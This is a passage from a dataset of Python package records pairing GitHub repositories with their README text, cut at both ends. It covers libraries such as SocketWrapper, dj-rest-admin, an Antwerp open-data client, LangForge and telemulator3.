    def __init__(self, layer_size: int, activation: str) -> None:
        self.layer_size = layer_size
        self.activation = activation

@skeletonkey.unlock(""config.yaml"")
def main(args):
    model = skeletonkey.instantiate(args.model)
    print(""Model layer size: "", model.layer_size)
    print(""Model activation: "", model.activation)
    print(""Number of Epochs: "", args.epochs)

if __name__ == ""__main__"":  
    main()
```

To run the example above, create a config.yaml file with the following content:
```yaml
epochs: 128
model:
  _target_: MyModel
  layer_size: 128
  activation: relu
```
To run the script and overwrite default arguments, use the command:
```bash
python project.py --epochs 256
```


",sizemore0125/skeletonkey
socketwrapper,https://github.com/JarredTD/Socket_Wrapper,0,1516,1516,"# SocketWrapper

This project contains two classes: A client, and a server class. The goal is to abstract on the process of setting up clients and servers.
You can simply create a client, and a server, feeding both an IP and a port. The objects will use that information to set up sockets, and for the server, bind to a socket.

Both the server and client have error checking, which throw errors in the case of invalid input for the IP or Port.

## Table of Contents
- [Installation](#installation)
- [Usage](#usage)
- [Technologies](#technologies)
- [TODO](#todo)

## Installation

To use the SocketWrapper Package, follow the steps below:

1. Import the package using: `pip install SocketWrapper`
2. Import Client from Client.py: `from SocketWrapper.Client import Client`
3. Import Server from Server.py `from SocketWrapper.Server import Server` 

## Usage

Once you have installed SocketWrapper, you can use it to create server and client objects. You can do this by following the steps below:

1. new_client = Client(ip, port)

2. new_server = Server(ip, port)

## Technologies

SockerWrapper was developed using the following technologies:

- Python
- socket library
- os library

## TODO
- Create custom exceptions
- Create default constructors (optional \__init__ parameters)
- Create tests
- Add more functionality
- Add more detail to the methods and classes of input and output

## License

SocketWrapper is open source software licensed under the [MIT License](https://opensource.org/licenses/MIT).






","# SocketWrapper

This project contains two classes: A client, and a server class. The goal is to abstract on the process of setting up clients and servers.
You can simply create a client, and a server, feeding both an IP and a port. The objects will use that information to set up sockets, and for the server, bind to a socket.

Both the server and client have error checking, which throw errors in the case of invalid input for the IP or Port.

## Table of Contents
- [Installation](#installation)
- [Usage](#usage)
- [Technologies](#technologies)
- [TODO](#todo)

## Installation

To use the SocketWrapper Package, follow the steps below:

1. Import the package using: `pip install SocketWrapper`
2. Import Client from Client.py: `from SocketWrapper.Client import Client`
3. Import Server from Server.py `from SocketWrapper.Server import Server` 

## Usage

Once you have installed SocketWrapper, you can use it to create server and client objects. You can do this by following the steps below:

1. new_client = Client(ip, port)

2. new_server = Server(ip, port)

## Technologies

SockerWrapper was developed using the following technologies:

- Python
- socket library
- os library

## TODO
- Create custom exceptions
- Create default constructors (optional \__init__ parameters)
- Create tests
- Add more functionality
- Add more detail to the methods and classes of input and output

## License

SocketWrapper is open source software licensed under the [MIT License](https://opensource.org/licenses/MIT).






",jarredtd/socket_wrapper
dj-rest-admin,https://github.com/dfg-98/dj-rest-admin,8,4099,4099,"# This is a fork of [BdVade/DRF-admin](https://github.com/BdVade/DRF-admin) project

This repo has been renamed in order to avoid confusions with BdVade/DRF-admin and will be
mantained by myself. 

Any contribution and feature requests are welcome!

# dj-rest-admin
A package to generate CRUD endpoints for registered models with the Django-REST Framework. 

## Requirements
- [Django](https://docs.djangoproject.com/en/4.0/)
- [Django Rest Framework](https://www.django-rest-framework.org/)

## Installation
To install run:

`pip install drf-admin`

## Usage
- Add rest_admin.py in your app dirs for defining RestModelAdmin
- Import dj_rest_admin in the rest_admin.py 
- Call `dj_rest_admin.site.register(Model)` Model being the model to register 
- Add rest admin to your urls.py file.
- [Optional] Add `dj_rest_admin` to your `INSTALLED_APPS` for admin autodiscover.

## Prerequisite
- rest_framework should be properly set up to use this package hitch free

A sample of it's configuration in the settings file:
```python
 REST_FRAMEWORK={
            'DEFAULT_SCHEMA_CLASS': 'rest_framework.schemas.coreapi.AutoSchema',
            'TEST_REQUEST_RENDERER_CLASSES': [
                'rest_framework.renderers.MultiPartRenderer',
                'rest_framework.renderers.JSONRenderer',
                'rest_framework.renderers.TemplateHTMLRenderer', ],
            ""DEFAULT_AUTHENTICATION_CLASSES"": [
                'rest_framework.authentication.SessionAuthentication',
                'rest_framework.authentication.BasicAuthentication'
            ],
            ""DEFAULT_PERMISSION_CLASSES"": [
                'rest_framework.permissions.AllowAny',
            ]
        }
```

For example: 

models.py
```python
from django.db import models

class TestModel(models.Model):
    age = models.IntegerField()
```

admin.py
```python
from .models import TestModel
import dj_rest_admin

dj_rest_admin.site.register(TestModel)
```
urls.py
```python
from restadmin import site
from django.urls import path




urlpatterns = [
    ...
    path('restadmin/', site.urls),
    ...
]
```

## Customization
This package allows you to specify the following when registering your model
- `serializer_or_modeladmin`: A Model Serializer Class or a subclass of `RestModelAdmin`
- ` permission_classes`: A list of Permission classes
- `pagination_classs`: A Pagination Class

An example of how a call to the register method with all 3 would look is :
```python
dj_rest_admin.site.register(TestModel, serializer_or_modeladmin=AdminSerializer, permission_classes=[ReadOnly], 
                        pagination_class=LargeResultsSetPagination)

```

`RestModelAdmin` expose the same interface as `ModelViewSet` so you can add the whole customizations that
`ModelViewSet` offers. This includes:

- Custom querysets
- redifining defaults methods
- add actions as ModelViewSet's exta actions

You can also register models with the `register` decorator

Example:
```python
from dj_rest_admin import register, RestModelAdmin
from .models import TestModel

@register(TestModel)
class TestRestModelAdmin(RestModelAdmin):

    serializer_class = MyCustomSerializer # Optional. A default is provided if None defined

    def get_queryset(self):
        queryset = TestModel.objects.filter(age__lt=30)
        return queryset

```

## Endpoint Documentation
* This requires you to have coreapi installed

A page to document the Endpoints generated can be accessed by adding the following to your base urls file

```python
from dj_rest_admin import site


urlpatterns = [
   ...
    path('restadmin-docs/', site.docs)
    ...
]
```


Using this would require you to have your default schema Class set in your REST_FRAMEWORK config in your settings.py file
E.g

```
REST_FRAMEWORK = { 'DEFAULT_SCHEMA_CLASS': 'rest_framework.schemas.coreapi.AutoSchema' }
```
Run your server and you can find the documentation at ` http://127.0.0.1:8000/restadmin-docs`
NOTE: The Documentation page is restricted to staff only(is_staff has to be True)
## Tests
To run the tests:

From the base directory run :
```
python load_tests.py
```
","# This is a fork of [BdVade/DRF-admin](https://github.com/BdVade/DRF-admin) project

This repo has been renamed in order to avoid confusions with BdVade/DRF-admin and will be
mantained by myself. 

Any contribution and feature requests are welcome!

# dj-rest-admin
A package to generate CRUD endpoints for registered models with the Django-REST Framework. 

## Requirements
- [Django](https://docs.djangoproject.com/en/4.0/)
- [Django Rest Framework](https://www.django-rest-framework.org/)

## Installation
To install run:

`pip install drf-admin`

## Usage
- Add rest_admin.py in your app dirs for defining RestModelAdmin
- Import dj_rest_admin in the rest_admin.py 
- Call `dj_rest_admin.site.register(Model)` Model being the model to register 
- Add rest admin to your urls.py file.
- [Optional] Add `dj_rest_admin` to your `INSTALLED_APPS` for admin autodiscover.

## Prerequisite
- rest_framework should be properly set up to use this package hitch free

A sample of it's configuration in the settings file:
```python
 REST_FRAMEWORK={
            'DEFAULT_SCHEMA_CLASS': 'rest_framework.schemas.coreapi.AutoSchema',
            'TEST_REQUEST_RENDERER_CLASSES': [
                'rest_framework.renderers.MultiPartRenderer',
                'rest_framework.renderers.JSONRenderer',
                'rest_framework.renderers.TemplateHTMLRenderer', ],
            ""DEFAULT_AUTHENTICATION_CLASSES"": [
                'rest_framework.authentication.SessionAuthentication',
                'rest_framework.authentication.BasicAuthentication'
            ],
            ""DEFAULT_PERMISSION_CLASSES"": [
                'rest_framework.permissions.AllowAny',
            ]
        }
```

For example: 

models.py
```python
from django.db import models

class TestModel(models.Model):
    age = models.IntegerField()
```

admin.py
```python
from .models import TestModel
import dj_rest_admin

dj_rest_admin.site.register(TestModel)
```
urls.py
```python
from restadmin import site
from django.urls import path




urlpatterns = [
    ...
    path('restadmin/', site.urls),
    ...
]
```

## Customization
This package allows you to specify the following when registering your model
- `serializer_or_modeladmin`: A Model Serializer Class or a subclass of `RestModelAdmin`
- ` permission_classes`: A list of Permission classes
- `pagination_classs`: A Pagination Class

An example of how a call to the register method with all 3 would look is :
```python
dj_rest_admin.site.register(TestModel, serializer_or_modeladmin=AdminSerializer, permission_classes=[ReadOnly], 
                        pagination_class=LargeResultsSetPagination)

```

`RestModelAdmin` expose the same interface as `ModelViewSet` so you can add the whole customizations that
`ModelViewSet` offers. This includes:

- Custom querysets
- redifining defaults methods
- add actions as ModelViewSet's exta actions

You can also register models with the `register` decorator

Example:
```python
from dj_rest_admin import register, RestModelAdmin
from .models import TestModel

@register(TestModel)
class TestRestModelAdmin(RestModelAdmin):

    serializer_class = MyCustomSerializer # Optional. A default is provided if None defined

    def get_queryset(self):
        queryset = TestModel.objects.filter(age__lt=30)
        return queryset

```

## Endpoint Documentation
* This requires you to have coreapi installed

A page to document the Endpoints generated can be accessed by adding the following to your base urls file

```python
from dj_rest_admin import site


urlpatterns = [
   ...
    path('restadmin-docs/', site.docs)
    ...
]
```


Using this would require you to have your default schema Class set in your REST_FRAMEWORK config in your settings.py file
E.g

```
REST_FRAMEWORK = { 'DEFAULT_SCHEMA_CLASS': 'rest_framework.schemas.coreapi.AutoSchema' }
```
Run your server and you can find the documentation at ` http://127.0.0.1:8000/restadmin-docs`
NOTE: The Documentation page is restricted to staff only(is_staff has to be True)
## Tests
To run the tests:

From the base directory run :
```
python load_tests.py
```
",dfg-98/dj-rest-admin
antwerpen,https://github.com/klaasnicolaas/python-antwerpen,3,8265,8152,"<!-- Banner -->
![alt Banner of the odp antwerpen package](https://raw.githubusercontent.com/klaasnicolaas/python-antwerpen/main/assets/header_odp_antwerpen-min.png)

<!-- PROJECT SHIELDS -->
[![GitHub Release][releases-shield]][releases]
[![Python Versions][python-versions-shield]][pypi]
![Project Stage][project-stage-shield]
![Project Maintenance][maintenance-shield]
[![License][license-shield]](LICENSE)

[![GitHub Activity][commits-shield]][commits-url]
[![PyPi Downloads][downloads-shield]][downloads-url]
[![GitHub Last Commit][last-commit-shield]][commits-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

[![Code Quality][code-quality-shield]][code-quality]
[![Build Status][build-shield]][build-url]
[![Typing Status][typing-shield]][typing-url]

[![Maintainability][maintainability-shield]][maintainability-url]
[![Code Coverage][codecov-shield]][codecov-url]

Asynchronous Python client for the open datasets of Antwerpen (Belgium).

## About

A python package with which you can retrieve data from the Open Data Platform of Antwerpen via [their API][api]. This package was initially created to only retrieve parking data from the API, but the code base is made in such a way that it is easy to extend for other datasets from the same platform.

## Installation

```bash
pip install antwerpen
```

## Datasets

You can read the following datasets with this package:

- [Disabled parking spaces / Minder valide parkings][disabled_parkings] (1677 locations)

**Note**: even though the dataset indicates that there are 1677 records, the API appears to have a hard limit of 1000 records.

---

There are a number of parameters you can set to retrieve the data:

- **limit** (default: 10) - How many results you want to retrieve.

<details>
    <summary>Click here to get more details</summary>

### Disabled parking spaces

| Variable | Type | Description |
| :------- | :--- | :---------- |
| `entry_id` | integer | The ID of this location |
| `number` | integer | The number of parking spots on this location |
| `orientation` | string | The orientation of this location |
| `destination` | string | The destination of this location |
| `window_time` | string (none) | The window time of this location |
| `lined` | boolean | Whether this location is lined |
| `status` | string | The status of this location |
| `gis_id` | string | The GIS ID of this location |
| `created_at` | datetime | The date this location was added to the dataset, not all locations have a value |
| `coordinates` | list (float) | The coordinates of this location |

</details>

## Example

```python
import asyncio

from antwerpen import ODPAntwerpen


async def main() -> None:
    """"""Show example on using the Parking Antwerpen API client.""""""
    async with ODPAntwerpen() as client:
        disabled_parkings = await client.disabled_parkings(limit=10)
        print(disabled_parkings)


if __name__ == ""__main__"":
    asyncio.run(main())
```

## Use cases

[NIPKaart.nl][nipkaart]

A website that provides insight into where disabled parking spaces are, based on data from users and municipalities. Operates mainly in the Netherlands, but also has plans to process data from abroad.

## Contributing

This is an active open-source project. We are always open to people who want to
use the code or contribute to it.

We've set up a separate document for our
[contribution guidelines](CONTRIBUTING.md).

Thank you for being involved! :heart_eyes:

## Setting up development environment

This Python project is fully managed using the [Poetry][poetry] dependency
manager.

You need at least:

- Python 3.9+
- [Poetry][poetry-install]

Install all packages, including all development requirements:

```bash
poetry install
```

Poetry creates by default an virtual environment where it installs all
necessary pip packages, to enter or exit the venv run the following commands:

```bash
poetry shell
exit
```

Setup the pre-commit check, you must run this inside the virtual environment:

```bash
pre-commit install
```

*Now you're all set to get started!*

As this repository uses the [pre-commit][pre-commit] framework, all changes
are linted and tested with each commit. You can run all checks and tests
manually, using the following command:

```bash
poetry run pre-commit run --all-files
```

To run just the Python tests:

```bash
poetry run pytest
```

## Credits

Photo used in header was taken by [Bert Kaufmann](https://www.flickr.com/photos/22746515@N02/50497311187/in/photostream/).

## License

MIT License

Copyright (c) 2022-2023 Klaas Schoute

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

[api]: https://portaal-stadantwerpen.opendata.arcgis.com
[disabled_parkings]: https://portaal-stadantwerpen.opendata.arcgis.com/datasets/stadAntwerpen::parkeerplaatsen-voor-personen-met-een-handicap/about
[nipkaart]: https://www.nipkaart.nl

<!-- MARKDOWN LINKS & IMAGES -->
[build-shield]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/tests.yaml/badge.svg
[build-url]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/tests.yaml
[code-quality-shield]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/codeql.yaml/badge.svg
[code-quality]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/codeql.yaml
[commits-shield]: https://img.shields.io/github/commit-activity/y/klaasnicolaas/python-antwerpen.svg
[commits-url]: https://github.com/klaasnicolaas/python-antwerpen/commits/main
[codecov-shield]: https://codecov.io/gh/klaasnicolaas/python-antwerpen/branch/main/graph/badge.svg?token=LJULYJC8VT
[codecov-url]: https://codecov.io/gh/klaasnicolaas/python-antwerpen
[downloads-shield]: https://img.shields.io/pypi/dm/antwerpen
[downloads-url]: https://pypistats.org/packages/antwerpen
[issues-shield]: https://img.shields.io/github/issues/klaasnicolaas/python-antwerpen.svg
[issues-url]: https://github.com/klaasnicolaas/python-antwerpen/issues
[license-shield]: https://img.shields.io/github/license/klaasnicolaas/python-antwerpen.svg
[last-commit-shield]: https://img.shields.io/github/last-commit/klaasnicolaas/python-antwerpen.svg
[maintenance-shield]: https://img.shields.io/maintenance/yes/2023.svg
[maintainability-shield]: https://api.codeclimate.com/v1/badges/43af030f43d5f3bc6a90/maintainability
[maintainability-url]: https://codeclimate.com/github/klaasnicolaas/python-antwerpen/maintainability
[project-stage-shield]: https://img.shields.io/badge/project%20stage-experimental-yellow.svg
[pypi]: https://pypi.org/project/antwerpen/
[python-versions-shield]: https://img.shields.io/pypi/pyversions/antwerpen
[typing-shield]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/typing.yaml/badge.svg
[typing-url]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/typing.yaml
[releases-shield]: https://img.shields.io/github/release/klaasnicolaas/python-antwerpen.svg
[releases]: https://github.com/klaasnicolaas/python-antwerpen/releases
[stars-shield]: https://img.shields.io/github/stars/klaasnicolaas/python-antwerpen.svg
[stars-url]: https://github.com/klaasnicolaas/python-antwerpen/stargazers

[poetry-install]: https://python-poetry.org/docs/#installation
[poetry]: https://python-poetry.org
[pre-commit]: https://pre-commit.com
","
![alt Banner of the odp antwerpen package](https://raw.githubusercontent.com/klaasnicolaas/python-antwerpen/main/assets/header_odp_antwerpen-min.png)


[![GitHub Release][releases-shield]][releases]
[![Python Versions][python-versions-shield]][pypi]
![Project Stage][project-stage-shield]
![Project Maintenance][maintenance-shield]
[![License][license-shield]](LICENSE)

[![GitHub Activity][commits-shield]][commits-url]
[![PyPi Downloads][downloads-shield]][downloads-url]
[![GitHub Last Commit][last-commit-shield]][commits-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

[![Code Quality][code-quality-shield]][code-quality]
[![Build Status][build-shield]][build-url]
[![Typing Status][typing-shield]][typing-url]

[![Maintainability][maintainability-shield]][maintainability-url]
[![Code Coverage][codecov-shield]][codecov-url]

Asynchronous Python client for the open datasets of Antwerpen (Belgium).

## About

A python package with which you can retrieve data from the Open Data Platform of Antwerpen via [their API][api]. This package was initially created to only retrieve parking data from the API, but the code base is made in such a way that it is easy to extend for other datasets from the same platform.

## Installation

```bash
pip install antwerpen
```

## Datasets

You can read the following datasets with this package:

- [Disabled parking spaces / Minder valide parkings][disabled_parkings] (1677 locations)

**Note**: even though the dataset indicates that there are 1677 records, the API appears to have a hard limit of 1000 records.

---

There are a number of parameters you can set to retrieve the data:

- **limit** (default: 10) - How many results you want to retrieve.


Click here to get more details

### Disabled parking spaces

| Variable | Type | Description |
| :------- | :--- | :---------- |
| `entry_id` | integer | The ID of this location |
| `number` | integer | The number of parking spots on this location |
| `orientation` | string | The orientation of this location |
| `destination` | string | The destination of this location |
| `window_time` | string (none) | The window time of this location |
| `lined` | boolean | Whether this location is lined |
| `status` | string | The status of this location |
| `gis_id` | string | The GIS ID of this location |
| `created_at` | datetime | The date this location was added to the dataset, not all locations have a value |
| `coordinates` | list (float) | The coordinates of this location |



## Example

```python
import asyncio

from antwerpen import ODPAntwerpen


async def main() -> None:
    """"""Show example on using the Parking Antwerpen API client.""""""
    async with ODPAntwerpen() as client:
        disabled_parkings = await client.disabled_parkings(limit=10)
        print(disabled_parkings)


if __name__ == ""__main__"":
    asyncio.run(main())
```

## Use cases

[NIPKaart.nl][nipkaart]

A website that provides insight into where disabled parking spaces are, based on data from users and municipalities. Operates mainly in the Netherlands, but also has plans to process data from abroad.

## Contributing

This is an active open-source project. We are always open to people who want to
use the code or contribute to it.

We've set up a separate document for our
[contribution guidelines](CONTRIBUTING.md).

Thank you for being involved! :heart_eyes:

## Setting up development environment

This Python project is fully managed using the [Poetry][poetry] dependency
manager.

You need at least:

- Python 3.9+
- [Poetry][poetry-install]

Install all packages, including all development requirements:

```bash
poetry install
```

Poetry creates by default an virtual environment where it installs all
necessary pip packages, to enter or exit the venv run the following commands:

```bash
poetry shell
exit
```

Setup the pre-commit check, you must run this inside the virtual environment:

```bash
pre-commit install
```

*Now you're all set to get started!*

As this repository uses the [pre-commit][pre-commit] framework, all changes
are linted and tested with each commit. You can run all checks and tests
manually, using the following command:

```bash
poetry run pre-commit run --all-files
```

To run just the Python tests:

```bash
poetry run pytest
```

## Credits

Photo used in header was taken by [Bert Kaufmann](https://www.flickr.com/photos/22746515@N02/50497311187/in/photostream/).

## License

MIT License

Copyright (c) 2022-2023 Klaas Schoute

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

[api]: https://portaal-stadantwerpen.opendata.arcgis.com
[disabled_parkings]: https://portaal-stadantwerpen.opendata.arcgis.com/datasets/stadAntwerpen::parkeerplaatsen-voor-personen-met-een-handicap/about
[nipkaart]: https://www.nipkaart.nl


[build-shield]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/tests.yaml/badge.svg
[build-url]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/tests.yaml
[code-quality-shield]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/codeql.yaml/badge.svg
[code-quality]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/codeql.yaml
[commits-shield]: https://img.shields.io/github/commit-activity/y/klaasnicolaas/python-antwerpen.svg
[commits-url]: https://github.com/klaasnicolaas/python-antwerpen/commits/main
[codecov-shield]: https://codecov.io/gh/klaasnicolaas/python-antwerpen/branch/main/graph/badge.svg?token=LJULYJC8VT
[codecov-url]: https://codecov.io/gh/klaasnicolaas/python-antwerpen
[downloads-shield]: https://img.shields.io/pypi/dm/antwerpen
[downloads-url]: https://pypistats.org/packages/antwerpen
[issues-shield]: https://img.shields.io/github/issues/klaasnicolaas/python-antwerpen.svg
[issues-url]: https://github.com/klaasnicolaas/python-antwerpen/issues
[license-shield]: https://img.shields.io/github/license/klaasnicolaas/python-antwerpen.svg
[last-commit-shield]: https://img.shields.io/github/last-commit/klaasnicolaas/python-antwerpen.svg
[maintenance-shield]: https://img.shields.io/maintenance/yes/2023.svg
[maintainability-shield]: https://api.codeclimate.com/v1/badges/43af030f43d5f3bc6a90/maintainability
[maintainability-url]: https://codeclimate.com/github/klaasnicolaas/python-antwerpen/maintainability
[project-stage-shield]: https://img.shields.io/badge/project%20stage-experimental-yellow.svg
[pypi]: https://pypi.org/project/antwerpen/
[python-versions-shield]: https://img.shields.io/pypi/pyversions/antwerpen
[typing-shield]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/typing.yaml/badge.svg
[typing-url]: https://github.com/klaasnicolaas/python-antwerpen/actions/workflows/typing.yaml
[releases-shield]: https://img.shields.io/github/release/klaasnicolaas/python-antwerpen.svg
[releases]: https://github.com/klaasnicolaas/python-antwerpen/releases
[stars-shield]: https://img.shields.io/github/stars/klaasnicolaas/python-antwerpen.svg
[stars-url]: https://github.com/klaasnicolaas/python-antwerpen/stargazers

[poetry-install]: https://python-poetry.org/docs/#installation
[poetry]: https://python-poetry.org
[pre-commit]: https://pre-commit.com
",klaasnicolaas/python-antwerpen
catalyst-lib,https://github.com/Catalyst-Studio/Lib_Files,0,0,0,,,catalyst-studio/lib_files
langforge-ai,https://github.com/mme/langforge,0,4093,4093,"![LangForge](https://github.com/mme/langforge/raw/main/docs/img/header.png ""LangForge"")

LangForge is an **open-source toolkit** designed to make it easy to create and deploy **_LangChain applications_**.

## Features

- Simplified environment setup and API key management
- Predefined notebooks for various use cases to help you get started quickly
- Instantly chat with your chains using the Jupyter integration
- Automatic REST interface generation for your app

## Installation

To install LangForge, simply run the following command:

```bash
pip install langforge-ai
```

## Getting Started

Use the create command to generate a new LangChain app.

LangForge will ask you a couple of questions, then set up a virtual environment, install required packages, and configure API keys, providing a ready-to-use foundation for your app.

```bash
langforge create myapp
```

When prompted to edit your API keys, input your OpenAI API key.

### Launch JupyterLab

Next, run the langforge lab command to launch Jupyter Lab.

```bash
cd myapp
langforge lab
```

Your project comes with ready-to-use templates for various use cases and an integration that allows you to chat with your chains directly within Jupyter.

In this example, we select the ""Creative ChatGPT"" template.

![Templates](https://github.com/mme/langforge/raw/main/docs/img/templates.png ""Templates"")

### Develop your LangChain app

Now that we have our notebook open, let's run the code.

Select `Kernel > Restart Kernel and Run All Cells...`

This template will make ChatGPT behave like an old school adventure game. To play with it, click the smiling robot face on the upper right to open a chat window.

![Chat](https://github.com/mme/langforge/raw/main/docs/img/chat.png ""Chat"")

Great! Note that upon running the first cell, a table displaying your API keys will appear. If your OpenAI key was not set during app creation, simply click the edit button and input your key.

```python
# make sure all packages are installed and environment variables are set
%setup langchain openai
```

![API Key](https://github.com/mme/langforge/raw/main/docs/img/api-key.png ""API Key"")

Let's change the prompt to customize our adventure. You can come up with any scenario you want. In this tutorial, we will go for a space adventure.

```python
template = """"""This is a conversation between a human and a system called AdventureGPT.

AdventureGPT is designed to create immersive and engaging text-based adventure games.

AdventureGPT is capable of understanding both simple commands, such as 'look,' and more
complex sentences, allowing it to effectively interpret the player's intent.

This adventure takes place in space. The player steps into the role of Captain Bravado,
a fearless and charismatic leader of the starship 'Infinity Chaser'.
Tasked with navigating the uncharted reaches of the cosmos, Captain Bravado and their
loyal crew must overcome various challenges, solve intricate puzzles, and make critical
decisions that will shape the fate of their mission and the future of interstellar
exploration.
""""""
```

Now rerun the cell and find yourself in an immersive space adventure!

### Serve your app

LangForge automatically generates a REST interface for your app, making it easy to deploy and share with others. When you are happy with your app, use the `serve` command followed by the name of your notebook to start serving your app.

```bash
langforge serve chat-creative.ipynb
```

We can now use curl to send HTTP requests to our app:

```
curl -X POST -H ""Content-Type: application/json"" -d '{""input"": ""look"", ""memory"": []}' http://localhost:2204/chat/gpt_adventure
```

Note that we include two keys in the JSON: input, which represents the user's command or message, and memory, which holds the conversation history to maintain context and continuity in the interaction.

## Contributing

We welcome contributions from the community! If you'd like to contribute to LangForge, please feel free to submit pull requests or open issues on our GitHub repository.

## License

LangForge is released under the MIT License.
","![LangForge](https://github.com/mme/langforge/raw/main/docs/img/header.png ""LangForge"")

LangForge is an **open-source toolkit** designed to make it easy to create and deploy **_LangChain applications_**.

## Features

- Simplified environment setup and API key management
- Predefined notebooks for various use cases to help you get started quickly
- Instantly chat with your chains using the Jupyter integration
- Automatic REST interface generation for your app

## Installation

To install LangForge, simply run the following command:

```bash
pip install langforge-ai
```

## Getting Started

Use the create command to generate a new LangChain app.

LangForge will ask you a couple of questions, then set up a virtual environment, install required packages, and configure API keys, providing a ready-to-use foundation for your app.

```bash
langforge create myapp
```

When prompted to edit your API keys, input your OpenAI API key.

### Launch JupyterLab

Next, run the langforge lab command to launch Jupyter Lab.

```bash
cd myapp
langforge lab
```

Your project comes with ready-to-use templates for various use cases and an integration that allows you to chat with your chains directly within Jupyter.

In this example, we select the ""Creative ChatGPT"" template.

![Templates](https://github.com/mme/langforge/raw/main/docs/img/templates.png ""Templates"")

### Develop your LangChain app

Now that we have our notebook open, let's run the code.

Select `Kernel > Restart Kernel and Run All Cells...`

This template will make ChatGPT behave like an old school adventure game. To play with it, click the smiling robot face on the upper right to open a chat window.

![Chat](https://github.com/mme/langforge/raw/main/docs/img/chat.png ""Chat"")

Great! Note that upon running the first cell, a table displaying your API keys will appear. If your OpenAI key was not set during app creation, simply click the edit button and input your key.

```python
# make sure all packages are installed and environment variables are set
%setup langchain openai
```

![API Key](https://github.com/mme/langforge/raw/main/docs/img/api-key.png ""API Key"")

Let's change the prompt to customize our adventure. You can come up with any scenario you want. In this tutorial, we will go for a space adventure.

```python
template = """"""This is a conversation between a human and a system called AdventureGPT.

AdventureGPT is designed to create immersive and engaging text-based adventure games.

AdventureGPT is capable of understanding both simple commands, such as 'look,' and more
complex sentences, allowing it to effectively interpret the player's intent.

This adventure takes place in space. The player steps into the role of Captain Bravado,
a fearless and charismatic leader of the starship 'Infinity Chaser'.
Tasked with navigating the uncharted reaches of the cosmos, Captain Bravado and their
loyal crew must overcome various challenges, solve intricate puzzles, and make critical
decisions that will shape the fate of their mission and the future of interstellar
exploration.
""""""
```

Now rerun the cell and find yourself in an immersive space adventure!

### Serve your app

LangForge automatically generates a REST interface for your app, making it easy to deploy and share with others. When you are happy with your app, use the `serve` command followed by the name of your notebook to start serving your app.

```bash
langforge serve chat-creative.ipynb
```

We can now use curl to send HTTP requests to our app:

```
curl -X POST -H ""Content-Type: application/json"" -d '{""input"": ""look"", ""memory"": []}' http://localhost:2204/chat/gpt_adventure
```

Note that we include two keys in the JSON: input, which represents the user's command or message, and memory, which holds the conversation history to maintain context and continuity in the interaction.

## Contributing

We welcome contributions from the community! If you'd like to contribute to LangForge, please feel free to submit pull requests or open issues on our GitHub repository.

## License

LangForge is released under the MIT License.
",mme/langforge
telemulator3,https://github.com/vb64/telemulator3,0,2948,2948,"# Library telemulator3

[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/vb64/telemulator3/pep257.yml?label=Pep257&style=plastic&branch=main)](https://github.com/vb64/telemulator3/actions?query=workflow%3Apep257)
[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/vb64/telemulator3/py3.yml?label=Python%203.7-3.11&style=plastic&branch=main)](https://github.com/vb64/telemulator3/actions?query=workflow%3Apy3)
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/fe568012ee1649b89bafbb4de163a0c0)](https://app.codacy.com/gh/vb64/telemulator3/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
[![Codacy Badge](https://app.codacy.com/project/badge/Coverage/fe568012ee1649b89bafbb4de163a0c0)](https://app.codacy.com/gh/vb64/telemulator3/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_coverage)

The free, open-source telemulator3 library designed to simplify automatic testing of Telegram bots created using the [pyTelegramBotAPI library](https://github.com/eternnoir/pyTelegramBotAPI).

The telemulator3 library partially emulates the Telegram Bot API in unit tests and allows you to create typical scenarios for the interaction of your bot with the Telegram Bot API.

## Installation

```bash
pip install telemulator3
```

## Usage

Create TeleBot instance and start emulate Telegram API for bot.

```python
from telebot import TeleBot
